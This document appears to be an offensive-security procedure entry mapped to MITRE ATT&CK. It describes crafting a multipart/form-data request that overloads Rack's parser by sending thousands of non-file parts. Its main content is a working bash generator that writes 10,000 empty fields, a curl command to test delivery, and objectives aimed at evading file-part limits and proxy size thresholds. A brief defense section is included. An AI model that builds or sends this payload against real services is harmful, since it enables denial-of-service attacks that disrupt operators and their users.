---
id: proc-rack-craft-001
tags:
  - dos
  - payload-craft
  - rack
  - multipart
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.191Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Craft Multipart DoS Request

## Summary

This procedure constructs a malicious multipart/form-data POST request body containing an excessive number of empty or field-only parts to exploit Rack's parser, which limits only file parts but not total parts, leading to processing overload.

## Description

The attack abuses the parser's design flaw by generating thousands of non-file parts (e.g., empty form fields), causing high CPU and memory usage during parsing. Based on the HackerOne disclosure, this targets any POST endpoint without total part limits. Prerequisites include knowledge of HTTP multipart format; outcomes are a ready-to-send payload file for DoS execution.

## Requirements

1. Text editor or scripting tool to generate the body
2. Understanding of multipart/form-data boundaries
3. Target endpoint URL from prior reconnaissance

## Defense

Defensive measures and detection strategies:

- Enforce total multipart parts limit in application code
- Use WAF rules to block requests with >100 parts
- Log and alert on parsing times exceeding 5 seconds

## Objectives

1. Create a payload with 10,000+ non-file parts
2. Ensure payload evades file-specific limits
3. Generate a body under proxy size thresholds for delivery

## Instructions

### Step 1: Define Boundary and Structure

**Context**: Start with a unique boundary string and outline the multipart structure.

**Command** (Manual or script):

Create a script to generate parts:

```bash
#!/bin/bash
boundary="boundary123"
echo "--$boundary" > dos_request.txt
for i in {1..10000}; do
  echo "Content-Disposition: form-data; name=\"field$i\"" >> dos_request.txt
  echo "" >> dos_request.txt
  echo "" >> dos_request.txt
  echo "--$boundary" >> dos_request.txt

done
echo "--$boundary--" >> dos_request.txt
```

> This generates a file with 10,000 empty fields; adjust count for impact.

### Step 2: Validate Payload

**Context**: Ensure the body is valid multipart format without file parts.

**Command** (Test parse locally if possible):

Use a tool like `curl` to a local echo server:

```bash
curl -X POST --data-binary @dos_request.txt -H "Content-Type: multipart/form-data; boundary=boundary123" http://localhost:8080
```

> Expected output: Parsed fields without errors; body size ~1-5MB.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- payload-generation
- dos-exploit
